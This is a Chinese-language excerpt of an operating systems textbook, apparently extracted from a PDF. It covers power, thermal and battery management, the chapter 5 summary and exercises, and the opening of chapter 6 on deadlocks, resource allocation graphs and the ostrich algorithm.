一种可能是让用户或应用程序来决定。
另一种方法是在若干秒的空 闲时间之后将其关闭。
应该在何时将无线电设备再次打开?
用户或应用程序可以再一次做出决定，或者 可以周期性地将其打开以检查到来的消息并且发送所有排队的消息。
当然，当输出缓冲区接近填满时也 应该将其打开。
各种各样的其他休眠方法也是可能的。
802.11(wifi) 网络中就有一个用无线网络支持此类电源管理框架的例子。
在802.11中，移动计算 机可以通知接入点它即将睡眠，不过可以在基站发送信号包之前醒来。
这些接入点会周期性的发送包， 并在发包的同时告诉移动计算机是否有数据等待处理。
如果没有数据，移动计算机会再次进入睡眠直到 下一个信号包到来。
6.热量管理
一个有一点不同但是仍然与能量相关的问题是热量管理。
现代CPU由于高速度而会变得非常热。
桌 面计算机通常拥有一个内部电风扇将热空气吹出机箱。
由于对于桌面计算机来说减少功率消耗通常并不 是一个重要的问题，所以风扇通常是始终开着的。
对于笔记本电脑，情况是不同的。
操作系统必须连续地监视温度，当温度接近最大可允许温度时， 操作系统可以选择打开风扇，这样会发出噪音并且消耗电能。
作为替代，它也可以借助于降低屏幕背光、 放慢CPU速度、更为激进地关闭磁盘等来降低功率消耗。
来自用户的某些输入也许是颇有价值的指导。
例如，用户可以预先设定风扇的噪音是令人不快的， 因而操作系统将选择降低功率消耗。
支持这种能耗管理方案的无线技术的例子可以在802.11 (WiFi) 网络中找到。
在802.11中，一台移 动计算机可以通知接入点它将进入睡眠，但是它将在基站发送下一个信标帧之前醒来。
接入点会周期性 地发出这样的帧。
此刻，接入点可以通知移动计算机它有数据待处理。
如果没有待处理的数据，移动计 算机可以再次睡眠，直到下一个信标帧。
7. 电池管理
在过去，电池仅仅提供电流直到其耗干，在耗干时电池就不会再有电了。
现在笔记本电脑使用的是 智能电池，它可以与操作系统通信。
在请求时，它可以报告其状况，例如最大电压、当前电压、最大负 荷、当前负荷、最大消耗速率、当前消耗速率等。
大多数笔记本电脑拥有能够查询与显示这些参数的程 序。
在操作系统的控制下，还可以命令智能电池改变各种工作参数。
某些笔记本电脑拥有多块电池。
当操作系统检测到一块电池将要用完时，它必须适度地安排转换到 下一块电池，在转换期间不能导致任何故障。
当最后一块电池濒临耗尽时，操作系统要负责向用户发出 警告然后促成有序的关机，例如，确保文件系统不被破坏。
8.驱动程序接口
Windows 系统拥有一个进行电源管理的精巧的机制，称为ACPI(Advanced Configuration and Power Interface,高级配置与电源接口)。
操作系统可以向任何符合标准的驱动程序发出命令，要求它报 告其设备的性能以及它们当前的状态。
当与即插即用相结合时，该特性尤其重要，因为在系统刚刚引导 之后，操作系统甚至还不知道存在什么设备，更不用说它们关于能量消耗或电源管理的属性了。
ACPI 还可以发送命令给驱动程序，命令它们削减其功耗水平(当然要基于早先获悉的设备性能)。
还存在某些其他方式的通信。
特别地，当一个设备(例如键盘或鼠标)在经历了一个时期的空闲之后检 测到活动时，这是一个信号让系统返回到(接近)正常运转。
5.8.3 应用程序问题
到目前为止，我们了解了操作系统能够降低各种类型的设备的能量使用量的方法。
但是，还存在着 另一种方法：指示程序使用较少的能量，即使这意味着提供低劣的用户体验(低劣的体验也比电池耗干 并且屏幕熄灭时没有体验要好)。
一般情况下，当电池的电荷低于某个阈值时传递这样的信息，然后由 应用程序负责在退化性能以延长电池寿命与维持性能并且冒着用光电池的危险之间作出决定。
这里出现的一个问题是程序怎样退化其性能以节省能量?
Flinn 和Satyanarayanan(2004) 研究了这 一问题，他们提供了退化的性能怎样能够节省能量的4个例子。
我们现在就看一看这些例子。
在他们的研究中，信息以各种形式呈现给用户。
当退化不存在时，呈现的是最优可能的信息。
当退化存 在时，呈现给用户的信息的保真度(准确度)比它能够达到的保真度要差。
我们很快就会看到这样的例子。
为了测量能量使用量，Flinn 和Satyanarayanan 发明了一个称为PowerScope的软件工具。
PowerScope 所做的事情是提供一个程序的电能使用量的概要剖析。
为了使用PowerScope, 计算机必须通过一个软件 控制的数字万用表接通一个外部电源。
使用万用表，软件可以读出从电源流进的电流的毫安数，并且因 此确定计算机正在消耗的瞬时功率。
PowerScope 所做的工作是周期性地采样程序计数器和电能使用量并 且将这些数据写到一个文件中。
当程序终止后，对文件进行分析就可以给出每个过程的能量使用量。
这 些测量形成了他们的观察结果的基础。
他们还利用硬件能量节约测量并且形成了基准线，对照该基准线 测量了退化的性能。
测量的第一个程序是一个视频播放器。
在未退化模式下，播放器以全分辨率和彩色方式每秒播放30 帧。
一种退化形式是舍弃彩色信息并且以黑白方式显示视频。
另一种退化形式是降低帧速率，这会导致 闪烁并且使电影呈现抖动的质量。
还有一种退化形式是在两个方向上减少像素数目，或者是通过降低空 间分辨率，或者是使显示的图像更小。
对这种类型的测量表明节省了大约30%的能量。
第二个程序是一个语音识别器，它对麦克风进行采样以构造波形。
该波形可以在笔记本电脑上进行分 析，也可以通过无线链路发送到固定计算机上进行分析，这样做节省了CPU消耗的能量但是会为无线电设 备而消耗能量。
通过使用比较小的词汇量和比较简单的声学模型可以实现退化，这样做的收益大约是35%。
第四个实验是传送JPEG图像到一个Web浏览器。
JPEG 标准允许各种算法，在图像质量与文件大小 之间进行中。
这里的收益平均只有9%。
总而言之，实验表明通过接受一些质量退化，用户能够在一个 给定的电池上运行更长的时间。
5.9 有关输入/输出的研究
载下的性能情况 (Li 等人，2013b;Shen 和Qi,2013)。
Vinaykumar,2012;Lai 和Tang,2013) 以及性能 (Han 等人，2012;Soorty,2012)。
当然也不是所有人都对笔记本电脑感兴趣。
一些学者在考虑如何为数据中心节省兆瓦级的能耗 (Fetzer 和Knauth,2012;Schwartz 等人，2012;wang 等人，2013b;Yuan 等人，2012)。
换一个角度， 一个很受关注的话题是传感网络中的能耗 (Albath 等人，2013;Mikhaylov 和 Tervonen,2013;Rasaneh 和Banirostam,2013;Severini 等人，2012)。
5.10 小结
输入/输出是一个经常被忽略但是十分重要的话题。
任何一个操作系统都有大量的组分与I/O 有关。
I/O 可以用三种方式来实现。
第一是程序控制I/O, 在这种方式下主CPU 输入或输出每个字节或字并且闲 置在一个密封的循环中等待，直到它能够获得或者发送下一个字节或字。
第二是中断驱动的I/O, 在这 种方式下CPU针对一个字节或字开始I/O 传送并且离开去做别的事情，直到一个中断到来发出信号通知 I/O 完成。
第三是DMA, 在这种方式下有一个单独的芯片管理着一个数据块的完整传送过程，只有当整 个数据块完成传送时才引发一个中断。
盘具有多种类型，包括磁盘、RAID 和各类光盘。
磁盘臂调度算法经常用来改进磁盘性能，但是虚 拟几何规格的出现使事情变得十分复杂。
通过将两块磁盘组成一对，可以构造稳定的存储介质，具有某 些有用的性质。
时钟可以用于跟踪实际时间，限制进程可以运行多长时间，处理监视定时器，以及进行记账。
许多个人计算机使用GUI 作为它们的输出。
GUI 基于WIMP 范式：窗口、图标、菜单和定点设备。
基于GUI的程序一般是事件驱动的，当键盘事件、鼠标事件和其他事件发生时立刻会被发送给程序以便 处理。
在UNIX系统中，GUI 几乎总是运行在X之上。
习题
1.芯片技术的发展已经使得将整个控制器包括所 有总线访问逻辑放在一个便宜的芯片上成为可 能。
这对于图1-6的模型具有什么影响?
2.已知图5-1列出的速度，是否可能以全速从一台 扫描仪扫描文档并且通过802.11g网络对其进行 传输?
请解释你的答案。
4.请解释超标量体系结构是如何权衡精确中断与 非精确中断的?
5.一个DMA控制器具有五个通道。
控制器最快可 以每40nsec 请求一个32 bit的数据，请求响应时 间也是40nsec 。
请问在这种情形下，总线传输 速度要多快才不会成为传输瓶颈。
6. 假设一个系统使用DMA将数据从磁盘控制器传 送到内存。
进一步假设平均花费t₁ns 获得总线， 并且花费t₂ns 在总线上传送一个字 (t₁>>t₂) 。
在 CPU 对DMA 控制器进行编程之后，如果(a)
采用一次一字模式，(b) 采用突发模式，从磁 盘控制器到内存传送1000个字需要多少时间?
假设向磁盘控制器发送命令需要获取总线以传 输一个字，并且应答传输也需要获取总线以传 输一个字。
7.一些DMA 控制器采用这样的模型：对每个要传 输的字，首先让设备驱动传输数据给DMA控制 器，然后再第二次发起总线请求将数据写入内 存。
如何使用这种模型进行内存到内存的复 制?
这种方式与使用CPU 进行内存复制的方式 相比具有哪些优点和缺点?
8. 假设一台计算机能够在5ns 内读或者写一个内存 字，并且假设当中断发生时，所有32位寄存器 连同程序计数器和PSW被压入堆栈。
该计算机
每秒能够处理的中断的最大数目是多少?
9.CPU 体系结构设计师知道操作系统开发者痛恨 非精确的中断。
满足OS 开发者的一种方法是当 得到一个中断信号通知时，让CPU 停止发射指 令，但是允许当前正在执行的指令完成，然后 强制中断。
这一方案是否有缺点?
请解释你的 答案。
13. 请解释OS 如何帮助安装新的驱动程序而无须 重新编译OS。
14. 以下各项工作是在四个I/O 软件层的哪一层完 成的?
(a) 为一个磁盘读操作计算磁道、扇区、磁头。
(b) 向设备寄存器写命令。
(c) 检查用户是否允许使用设备。
(d) 将二进制整数转换成ASCII码以便打印。
15.一个局域网以如下方式使用：用户发出一个系 统调用，请求将数据包写到网上，然后操作系
统将数据复制到一个内核缓冲区中，再将数据 复制到网络控制器接口板上。
当所有数据都安 全地存放在控制器中时，再将它们通过网络以 10Mb/s的速率发送。
在每一位被发送后，接收 的网络控制器以每微秒一位的速率保存它们。
当最后一位到达时，目标CPU被中断，内核将 新到达的数据包复制到内核缓冲区中进行检 查。
一旦判明该数据包是发送给哪个用户的， 内核就将数据复制到该用户空间。
如果我们假 设每一个中断及其相关的处理过程花费1ms 时 间，数据包为1024字节(忽略包头),并且复 制一个字节花费1μs 时间，那么将数据从一个 进程转储到另一个进程的最大速率是多少?
假 设发送进程被阻塞直到接收端结束工作并且返 回一个应答。
为简单起见，假设获得返回应答 的时间非常短，可以忽略不计。
16.为什么打印机的输出文件在打印前通常都假脱 机输出在磁盘上?
17.一个7200rpm的磁盘的磁道寻道时间为1msec, 该磁盘相邻柱面起始位置的偏移角度是多少?
磁盘的每个磁道包含200个扇区，每个扇区大 小为512B。
18.一个磁盘的转速为7200rpm, 一 个柱面上有 500个扇区，每个扇区大小为512B 。
读入一个 扇区需要多少时间?
19.计算上题所述磁盘的最大数据传输率。
20.3级RAID只使用一个奇偶驱动器就能够纠正一 位错误。
那么2级RAID的意义是什么?
毕竟2级 RAID 也只能纠正一位错误而且需要更多的驱 动器。
21.如果两个或更多的驱动器在很短的时间内崩 溃，那么RAID 就可能失效。
假设在给定的一 小时内一个驱动器崩溃的概率是p, 那么在给 定的一小时内具有k个驱动器的RAID失效的概 率是多少?
22.从读性能、写性能、空间开销以及可靠性方面 对0级RAID到5级RAID进行比较。
23.1ZB 等于多少PB?
24.为什么光存储设备天生地比磁存储设备具有更 高的数据密度?
注意：本题需要某些高中物理 以及磁场是如何产生的知识。
25.光盘和磁盘的优点和缺点各是什么?
26. 如果一个磁盘控制器没有内部缓冲， 一旦从磁 盘上接收到字节就将它们写到内存中，那么交 错编号还有用吗?
请讨论你的答案。
27.如果一个磁盘是双交错编号的，那么该磁盘是 否还需要柱面斜进以避免在进行磁道到磁道的 寻道时错过数据?
请讨论你的答案。
28.考虑一个包含16个磁头和400个柱面的磁盘。
该磁盘分成4个100柱面的区域，不同的区域分 别包含160个、200个、240个和280个扇区。
假 设每个扇区包含512字节，相邻柱面间的平均 寻道时间为1ms, 并且磁盘转速为7200rpm 。
计算磁盘容量、最优磁道斜进以及最大数据传 输率。
29.一个磁盘制造商拥有两种5.25英寸的磁盘，每 种磁盘都具有10000个柱面。
新磁盘的线性记 录密度是老磁盘的两倍。
在较新的驱动器上哪 个磁盘的特性更好，哪个无变化?
新的是否具 有什么劣势?
30.一个计算机制造商决定重新设计Pentium 硬盘 的分区表以提供四个以上的分区。
这一变化有 什么后果?
31.磁盘请求以柱面10、22、20、2、40、6和38的 次序进入磁盘驱动器。
寻道时每个柱面移动需 要6ms, 以下各算法所需的寻道时间是多少?
(b) 最近柱面优先。
(c) 电梯算法(初始向上移动)。
在各情形下，假设磁臂起始于柱面20。
32.调度磁盘请求的电梯算法的一个微小更改是总 是沿相同的方向扫描。
在什么方面这一更改的 算法优于电梯算法?
34.在讨论使用非易失性RAM的稳定的存储器时， 掩饰了如下要点。
如果稳定写完成但是在操作 系统能够将无效的块编号写入非易失性RAM 之前发生了崩溃，那么会有什么结果?
这一竞 争条件会毁灭稳定的存储器的抽象概念吗?
请 解释你的答案。
35.在关于稳定存储器的讨论中，证明了如果在写 过程中发生了CPU 崩溃，磁盘可以恢复到一个 一致的状态(写操作或者已完成，或者完全没 有发生)。
如果在恢复的过程中CPU再次崩溃， 这一特性是否还保持?
请解释你的答案。
36.在关于稳定存储器的讨论中， 一个关键假设是 当CPU 崩溃时，会导致一个扇区产生错误的 ECC 。
如果这个假设不成立的话，图5-27所示 的5个故障恢复场景会出现什么问题吗?
37.某计算机上的时钟中断处理程序每一时钟滴答 需 要 2ms (包括进程切换的开销),时钟以 60Hz 的频率运行，那么CPU 用于时钟处理的 时间比例是多少?
38.一台计算机以方波模式使用一个可编程时钟。
如果使用500MHz的晶体，为了达到如下时钟 分辨率，存储寄存器的值应该是多少?
(a)1ms (每毫秒一个时钟滴答)。
(b)100μs。
39.一个系统通过将所有未决的时钟请求链接在一 起而模拟多个时钟，如图5-30所示。
假设当前 时刻是5000,并且存在针对5008、5012、 5015、5029和5037时刻的未决的时钟请求。
请 指出在5000、5005和5013时刻时钟头、当前时 刻以及下一信号的值。
假设一个新的(未决的) 信号在5017时刻到来，该信号请求的时间是 5033。
请指出在5023时刻，时钟头、当前时刻 以及下一信号的值。
40. 许多UNIX 版本使用一个32位无符号整数作为 从时间原点计算的秒数来跟踪时间。
这些系统 什么时候会溢出(年与月)?
你认为这样的事 情会实际发生吗?
41.一个位图模式的终端包含1600×1200个像素。
为了滚动一个窗口，CPU (或者控制器)必须 向上移动所有的文本行，这是通过将文本行的 所有位从视频RAM的一部分复制到另一部分 实现的。
如果一个特殊的窗口高80行宽80个字 符(总共6400个字符),每个字符框宽8个像素 高16像素，那么以每个字节50ns的复制速率滚 动整个窗口需要多长时间?
如果所有的行都是 80个字符长，那么终端的等价波特率是多少?
将一个字符显示在屏幕上需要5 μs, 每秒能够 显示多少行?
42. 接收到一个DEL(SIGINT) 字符之后，显示 驱动程序将丢弃当前排队等候显示的所有输 出。
为什么?
43.一个用户在终端上给文本编辑器发出一个命令 要求删除第5行的第7~12个字符(包含第12个 字符)。
假设命令发出时光标并不在第5行，请 问编辑器要完成这项工作需要发出怎样的 ANSI 转义序列?
44.计算机系统的设计人员期望鼠标移动的最大速 率为20cm/s。
如果一个鼠标步是0.1mm, 并且每 个鼠标消息3个字节，假设每个鼠标步都是单独 报告的，那么鼠标的最大数据传输率是多少?
46.将字符放置在位图模式的屏幕上， 一种方法是 使 用BitBlt 从一个字体表复制位图。
假设一种 特殊的字体使用16×24像素的字符，并且采用 RGB 真彩色。
(a) 每个字符占用多少字体表空间?
(b) 如果复制一个字节花费100ns(包括系统开销), 那么到屏幕的输出率是每秒多少个字符?
47.假设复制一个字节花费10ns,那么对于80字符× 25行文本模式的内存映射的屏幕，完全重写屏 幕要花费多长时间?
采用24位彩色的1024× 768像素的图形屏幕情况怎样?
48. 在图5-36中存在一个窗口类需要调用Register- Class 进行注册，在图5-34中对应的X窗口代码 中，并不存在这样的调用或与此相似的任何调 用。
为什么?
Rectangle(hdc,xleft,ytop,xright,ybottom);
是否存在对于第一个参数 (hdc) 的实际需 要?
如果存在，是什么?
毕竟，矩形的坐标作 为参数而显式地指明了。
53. 如果一个CPU的最大电压V被削减到V/n, 那 么
它的功率消耗将下降到其原始值的1/n², 并且 它的时钟速度下降到其原始值的1/n。
假设一 个用户以每秒1个字符的速度键入字符，处理 每个字符所需要的CPU时间是100ms,n 的最 优值是多少?
与不削减电压相比，以百分比表 示相应的能量节约了多少?
假设空闲的CPU完 全不消耗能量。
54.一台笔记本电脑被设置成最大地利用功率节省 特性，包括在一段时间不活动之后关闭显示器 和硬盘。
一 个用户有时在文本模式下运行 UNIX 程序，而在其他时间使用X窗口系统。
她惊讶地发现当她使用仅限文本模式的程序 时，电池的寿命相当长。
为什么?
55.编写一个程序模拟稳定的存储器，在你的磁盘
上使用两个大型的固定长度的文件来模拟两块 磁盘。
56.编写一个程序实现三个磁盘臂调度算法。
编写 一个驱动程序随机生成一个柱面号序列(0~ 999),针对该序列运行三个算法并且打印出在 三个算法中磁盘臂需要来回移动的总距离(柱 面数)。
57.编写一个程序使用单一的时钟实现多个定时 器。
该程序的输入包含四种命令 (S <int>,T, E<int>,P) 的序列：S<int> 设置当前时刻为 <int>;T 是一个时钟滴答；E <int>调度一个信 号在<int> 时刻发生；P 打印出当前时刻、下一 信号和时钟头的值。
当唤起一个信号时，你的 程序还应该打印出一条语句。
第6章
Modern Operating Systems,Fourth Edition
死 锁
在计算机系统中有很多独占性的资源，在任一时刻它们都只能被一个进程使用。
常见的有打印机、 磁带以及系统内部表中的表项。
打印机同时让两个进程打印将造成混乱的打印结果；两个进程同时使用 同一文件系统表中的表项会引起文件系统的瘫痪。
正因为如此，操作系统都具有授权一个进程(临时) 排他地访问某一种资源的能力。
在很多应用中，需要一个进程排他性地访问若干种资源而不是一种。
例如，有两个进程准备分别将 扫描的文档记录到蓝光光盘上。
进程A请求使用扫描仪，并被授权使用。
但进程B首先请求蓝光光盘刻 录机，也被授权使用。
现在，A 请求使用蓝光光盘刻录机，但该请求在B释放蓝光光盘刻录机前会被拒 绝。
但是，进程B非但不放弃蓝光光盘刻录机，而且去请求扫描仪。
这时，两个进程都被阻塞，并且一 直处于这样的状态。
这种状况就是死锁 (deadlock)。
死锁也可能发生在机器之间。
例如，许多办公室中都用计算机连成局域网，扫描仪、蓝光光盘/ DVD刻录机、打印机和磁带机等设备也连接到局域网上，成为共享资源，供局域网中任何机器上的人和 用户使用。
如果这些设备可以远程保留给某一个用户(比如，在用户家里的机器使用这些设备),那么, 也会发生上面描述的死锁现象。
更复杂的情形会引起三个、四个或更多设备和用户发生死锁。
在本章里，我们准备考察几类死锁，了解它们是如何出现的，学习防止或者避免死锁的办法。
尽管 我们所讨论的是操作系统环境下出现的死锁问题，但是在数据库系统和许多计算机应用环境中都可能产 生死锁，所以我们所介绍的内容实际上可以应用到包含多个进程的系统中。
有很多有关死锁的著作， 《Operating Systems Review》中列出了两本参考书 (Newton,1979;Zobel,1983), 有兴趣的读者可以参
考这两本书。
死锁方面的大多数研究工作在1980年以前就完成了，尽管所列的参考文献有些老，但是这 些内容依然是很有用的。
6.1 资源
6.1.1 可抢占资源和不可抢占资源
资源分为两类：可抢占的和不可抢占的。
可抢占资源 (preemptable resource) 可以从拥有它的进程 中抢占而不会产生任何副作用，存储器就是一类可抢占的资源。
例如，一个系统拥有256MB的用户内存 和一台打印机。
如果有两个256MB内存的进程都想进行打印，进程A请求并获得了打印机，然后开始计 算要打印的值。
在它没有完成计算任务之前，它的时间片就已经用完并被换出。
然后，进程B开始运行并请求打印机，但是没有成功。
这时有潜在的死锁危险。
由于进程A拥有打 印机，而进程B占有了内存，两个进程都缺少另外一个进程拥有的资源，所以任何一个都不能继续执行。
不过，幸运的是通过把进程B换出内存、把进程A换入内存就可以实现抢占进程B的内存。
这样，进程A 继续运行并执行打印任务，然后释放打印机。
在这个过程中不会产生死锁。
相反，不可抢占资源 (nonpreemptable resource)是指在不引起相关的计算失败的情况下，无法把 它从占有它的进程处抢占过来。
如果一个进程已开始刻盘，突然将蓝光光盘刻录机分配给另一个进程， 那么将划坏蓝光光盘。
在任何时刻蓝光光盘刻录机都是不可抢占的。
某个资源是否可抢占取决于上下文环境。
在一台标准的PC中，内存中的页面总是可以置换到磁盘 中并置换回来，故内存是可抢占的。
但是在一部不支持交换和页面调度的智能机上，仅通过将内存消耗 大户交换出来是不能避免死锁的。
总的来说，死锁与不可抢占资源有关，有关可抢占资源的潜在死锁通常可以通过在进程之间重新分 配资源而化解。
所以，我们的重点放在不可抢占资源上。
使用一个资源所需要的事件顺序可以用抽象的形式表示如下：
1)请求资源。
2)使用资源。
3)释放资源。
若请求时资源不可用，则请求进程被迫等待。
在一些操作系统中，资源请求失败时进程会自动被阻 塞，在资源可用时再唤醒它。
在其他的系统中，资源请求失败会返回一个错误代码，请求的进程会等待 一段时间，然后重试。
当一个进程请求资源失败时，它通常会处于这样一个小循环中：请求资源，休眠，再请求。
这个进 程虽然没有被阻塞，但是从各角度来说，它不能做任何有价值的工作，实际和阻塞状态一样。
在后面的 讨论中，我们假设：如果某个进程请求资源失败，那么它就进入休眠状态。
请求资源的过程是非常依赖于系统的。
在某些系统中，提供了request 系统调用，用于允许进程资 源请求。
在另一些系统中，操作系统只知道资源是一些特殊文件，在任何时刻它们最多只能被一个进程 打开。
一般情况下，这些特殊文件用open 调用打开。
如果这些文件正在被使用，那么,发出open 调用 的进程会被阻塞，一直到文件的当前使用者关闭该文件为止。
6.1.2 资源获取
对于数据库系统中的记录这类资源，应该由用户进程来管理其使用。
一种允许用户管理资源的可能方法是为每一个资源配置一个信号量。
这 些信号量都被初始化为1。
互斥信号量也能起到相同的作用。
上述的三个 步骤可以实现为信号量的down 操作来获取资源，使用资源，最后使用 up 操作来释放资源。
这三个步骤如图6-1a所示。
有时候，进程需要两个或更多的资源，它们可以顺序获得，如 图6-1b 所示。
如果需要两个以上的资源，通常都是连续获取。
到目前为止，进程的执行不会出现问题。
在只有一个进程参与时， 所有的工作都可以很好地完成。
当然，如果只有一个进程，就没有必要 这么慎重地获取资源，因为不存在资源竞争。
现在考虑两个进程 (A 和B) 以及两个资源的情况。
图6-2描述了两 种不同的方式。
在图6-2a中，两个进程以相同的次序请求资源；在图6- 2b中，它们以不同的次序请求资源。
这种不同看似微不足道，实则不然。
图6-2b的情况就不同了。
可能其中一个进程获取了两个资源并有 效地阻塞了另外一个进程，直到它使用完这两个资源为止。
但是，也
typedef int semaphore; semaphore resource_1;
void process_A(void){ down(&resource_1); use_resource_1(); up(&resource_1);
}
a)
图6-1 使用信号量保护资源：
a)一个资源；b)两个资源
有可能进程A获取了资源1,进程B获取了资源2,每个进程如果都想请求另一个资源就会被阻塞，那 么,每个进程都无法继续运行。
这种情况就是死锁。
这里我们可以看到一个编码风格上的细微差别(哪一个资源先获取)造成了可以执行的程序和不能 执行而且无法检测错误的程序之间的差别。
因为死锁是非常容易发生的，所以有很多人研究如何处理这
种情况。
这一 章就会详细讨论死锁问题，并给出一些对策。
a) b)
图6-2 a) 无死锁的编码；b) 有可能出现死锁的编码
6.2 死锁简介
死锁的规范定义如下：如果一个进程集合中的每个进程都在等待只能由该进程集合中的其他进程才 能引发的事件，那么,该进程集合就是死锁的。
由于所有的进程都在等待，所以没有一个进程能引发可以唤醒该进程集合中的其他进程的事件，这样， 所有的进程都只好无限期等待下去。
在这一模型中，我们假设进程只含有一个线程，并且被阻塞的进程无法由 中断唤醒。
无中断条件使死锁的进程不能被时钟中断等唤醒，从而不能引发释放该集合中的其他进程的事件。
在大多数情况下，每个进程所等待的事件是释放进程集合中其他进程所占有的资源。
换言之，这一 死锁进程集合中的每一个进程都在等待另一个死锁的进程已经占有的资源。
但是由于所有进程都不能运 行，它们中的任何一个都无法释放资源，所以没有一个进程可以被唤醒。
进程的数量以及占有或者请求 的资源数量和种类都是无关紧要的，而且无论资源是何种类型(软件或者硬件)都会发生这种结果。
这 种死锁称为资源死锁 (resource deadlock)。
这是最常见的类型，但并不是唯一的类型。
本节我们会详细 介绍一下资源死锁，在本章末再概述其他类型的死锁。
6.2.1 资源死锁的条件
Coffman等人(1971)总结了发生(资源)死锁的四个必要条件：
1)互斥条件。
每个资源要么已经分配给了一个进程，要么就是可用的。
2)占有和等待条件。
已经得到了某个资源的进程可以再请求新的资源。
3)不可抢占条件。
已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。
4)环路等待条件。
死锁发生时，系统中一定有由两个或两个以上的进程组成的一条环路，该环路中 的每个进程都在等待着下一个进程所占有的资源。
死锁发生时，以上四个条件一定是同时满足的。
如果其中任何一个条件不成立，死锁就不会发生。
值得注意的是，每一个条件都与系统的一种可选策略相关。
一种资源能否同时分配给不同的进程?
一个进程能否在占有一个资源的同时请求另一个资源?
资源能否被抢占?
循环等待环路是否存在?
我们 在后面会看到怎样通过破坏上述条件来预防死锁。
6.2.2 死锁建模
Holt(1972) 指出如何用有向图建立上述四个条件的模型。
在有向图中有两类节点：用圆形表示 的进程，用方形表示的资源。
从资源节点到进程节点的有向边代表该资源已被请求、授权并被进程占用。
在图6-3a 中，当前资源R 正 被 进 程A占 用 。
由进程节点到资源节点的有向边表明当前进程正 在请求该资源，并且该进程已被阻塞，处于等待该资 源的状态。
在图6-3b中 ， 进 程B正等待着资源S 。
图6- 3c 说明进入了死锁状态：进程C等待着资源T, 资源T被进 程D占用着，进程D又等待着由进程C占用着的资源U。
这样两个进程都得等待下去。
图中的环表示与这些进 程和资源有关的死锁。
在本例中，环是C-T-D-U-C。
a)
b)
c)
我们再看看使用资源分配图的方法。
假设有三个进 程 (A,B,C) 及三个资源 (R,S,T) 。
三个进程对资 源的请求和释放序列分别对应6-4a～图6-4c 。
操 作 系 统
图6-3 资源分配图：a) 占有一个资源；b) 请求
一 个资源； c) 死 锁
可以随时选择任一非阻塞进程运行，所以它可选择A运行 一 直到A完成其所有工作，接着运行B, 最 后 运 行C。
A
请求R
请求S
释放R
释放S
a)
B
请求S 请求T 释放S 释放T b)
C
请求T 请求R 释放T 释放R c)
1.A 请求R
2.B 请求S
3.C 请求T
4.A 请求S
5.B 请求T
6.C 请求R 死锁
d)
1.A 请求R
2.C 请求T
3.A 请求S
4.C 请求B
5.A 释放R
6.A 释放S 无死锁
k)
e) f) g)
h) i) j)
I) m) n)
o) p) q)
图6-4 一 个死锁是如何产生以及如何避免的例子
上述的执行次序不会引起死锁(因为没有资源的竞争),但程序也没有任何并行性。
进程在执行过 程中，不仅要请求和释放资源，还要做计算或者输入/输出工作。
如果进程是串行运行，不会出现一个 进程等待I/O的同时让另一个进程占用CPU 进行计算的情形。
因此，严格的串行操作有可能不是最优的。
不过，如果所有的进程都不执行I/O 操作，那么最短作业优先调度会比轮转调度优越，所以在这种情况 下，串行运行有可能是最优的。
如果假设进程操作包含I/O 和计算，那么轮转法是一种合适的调度算法。
对资源请求的次序可能会 如图6-4d所示。
图6-4e~ 图6-4j是按这个次序执行的相应的资源分配图。
在出现请求4后，如图6-4h所示， 进程A被阻塞等待S, 后续两步中的B和C也会被阻塞，结果如图6-4j所示，产生环路并导致死锁。
不过正如前面所讨论的，并没有规定操作系统要按照某一特定的次序来运行这些进程。
特别地，对 于一个有可能引起死锁的资源请求，操作系统可以干脆不批准请求，并把该进程挂起(即不参与调度) 一直到处于安全状态为止。
在图6-4中，假设操作系统知道有引起死锁的可能，那么它可以不把资源S分 配给B, 这 样B被挂起。
假如只运行进程A和C, 那么资源请求和释放的过程会如图6-4k所示，而不是如 图6-4d所示。
这一过程的资源分配图在图6-41～图6-4q中给出，其中没有死锁产生。
在第q步执行完后，就可以把资源S分配给B了，因为A已经完成，而且C获得了它所需要的所有资 源。
尽管B会因为请求T而等待，但是不会引起死锁， B只需要等待C结束。
在本章后面我们将考察一个具体的算法，用以做出不会引起死锁的资源分配决策。
在这里需要说明 的是，资源分配图可以用作一种分析工具，考察对一给定的请求/释放的序列是否会引起死锁。
只需要 按照请求和释放的次序一步步进行，每一步之后都检查图中是否包括了环路。
如果有环路，那么就有死 锁；反之，则没有死锁。
在我们的例子中，虽然只和同一类资源有关，而且只包含一个实例，但是上面 的原理完全可以推广到有多种资源并含有若干个实例的情况中去 (Holt,1972)。
总而言之，有四种处理死锁的策略：
1)忽略该问题。
也许如果你忽略它，它也会忽略你。
2)检测死锁并恢复。
让死锁发生，检测它们是否发生， 一旦发生死锁，采取行动解决问题。
3)仔细对资源进行分配，动态地避免死锁。
4)通过破坏引起死锁的四个必要条件之一，防止死锁的产生。
下面四节将分别讨论这四种方法。
6.3 鸵鸟算法
最简单的解决方法是鸵鸟算法：把头埋到沙子里，假装根本没有问题发生甲。
每个人对该方法的看 法都不相同。
数学家认为这种方法根本不能接受，不论代价有多大，都要彻底防止死锁的产生；工程师 们想要了解死锁发生的频度、系统因各种原因崩溃的发生次数以及死锁的严重性。
如果死锁平均每5年 发生一次，而每个月系统都会因硬件故障、编译器错误或者操作系统故障而崩溃一次，那么大多数的工 程师不会以性能损失和可用性的代价去防止死锁。
为了能够让这一对比更具体，考虑如下情况的操作系统：当一个open 系统调用因物理设备(例如 蓝光驱动器或者打印机)忙而不能得到响应的时候，操作系统会阻塞调用该系统调用的进程。
通常是由 设备驱动来决定在这种情况下应该采取何种措施。
显然，阻塞或者返回一个错误代码是两种选择。
如果 一个进程成功地打开了蓝光驱动器，而另一个进程成功地打开了打印机，这时每个进程都会试图去打开 另外一个设备，系统会阻塞这种尝试，从而发生死锁。
现有系统很少能够检测到这种死锁。
6.4 死锁检测和死锁恢复
第二种技术是死锁检测和恢复。
在使用这种技术时，系统并不试图阻止死锁的产生，而是允许死锁 发生，当检测到死锁发生后，采取措施进行恢复。
本节我们将考察检测死锁的几种方法以及恢复死锁的 几种方法。
日 这一民间传说毫无道理。
鸵鸟每小时跑60公里，为了得到一顿丰盛的晚餐，它一脚的力量足以踢死一头狮子。
6.4.1 每种类型一个资源的死锁检测
我们从最简单的例子开始，即每种资源类型只有一个资源。
这样的系统可能有扫描仪、蓝光光盘刻 录机、绘图仪和磁带机，但每种设备都不超过一个，即排除了同时有两台打印机的情况。
稍后我们将用 另一种方法来解决两台打印机的情况。
可以对这样的系统构造一张资源分配图，如图6-3所示。
如果这张图包含了一个或一个以上的环， 那么死锁就存在。
在此环中的任何一个进程都是死锁进程。
如果没有这样的环，系统就没有发生死锁。
我们讨论一下更复杂的情况，假设一个系统包括A到G共7个进程，R 到W共6种资源。
